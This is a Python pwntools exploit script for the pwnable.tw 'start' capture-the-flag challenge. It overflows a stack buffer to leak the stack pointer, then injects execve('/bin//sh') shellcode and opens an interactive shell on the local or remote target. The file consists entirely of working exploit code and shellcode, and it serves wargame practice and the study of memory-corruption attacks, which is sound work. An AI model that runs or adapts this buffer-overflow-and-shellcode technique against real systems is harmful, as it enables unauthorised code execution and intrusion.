#!/usr/bin/env python3

from pwn import *

elf = ELF("./start")

gdbscript = """
break _start
"""

if args.REMOTE:
    io = remote("chall.pwnable.tw", 10000)
elif args.GDB:
    io = gdb.debug(elf.path, gdbscript=gdbscript)
else:
    io = process(elf.path)

offset = 20

# step1: leak esp
eip = 0x08048087  # mov    ecx,esp
payload = b"A" * offset + p32(eip)

io.sendafter(b"Let's start the CTF:", payload)
esp = io.recv(4)

# step2: send and run shellcode
eip = u32(esp) + 20

# https://shell-storm.org/shellcode/files/shellcode-811.html
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
payload = b"A" * offset + p32(eip) + shellcode

io.recv(1024)
io.sendline(payload)

io.interactive()
